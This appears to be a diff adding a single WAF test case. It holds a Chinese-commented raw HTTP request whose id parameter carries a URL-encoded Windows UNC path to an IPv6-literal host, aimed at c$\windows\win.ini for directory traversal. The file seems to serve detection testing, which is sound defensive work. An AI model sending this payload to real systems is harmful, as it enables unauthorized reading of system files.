@@ -1,0 +1,9 @@
+# 目录遍历_UNC+IPV6地址
+# 攻击者可以将IPv6地址的Windows UNC共享(\UNC\share\)注入到软件系统中，从而可能重定向访问非预期位置或任意文件
+GET /?id=%5C%5C2001-DB8-2a-1005-230-48ff-fe73-989d.ipv6-literal.net%5Cc$%5Cwindows%5Cwin.ini&bid=hd_tag_m8mv23s1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23s1
+RM-PRO-Token: 71792e1f20d892d757af82597d452e61
+RM-PRO-Time: 1742808341177
+User-Agent: curl/7.83.1
+
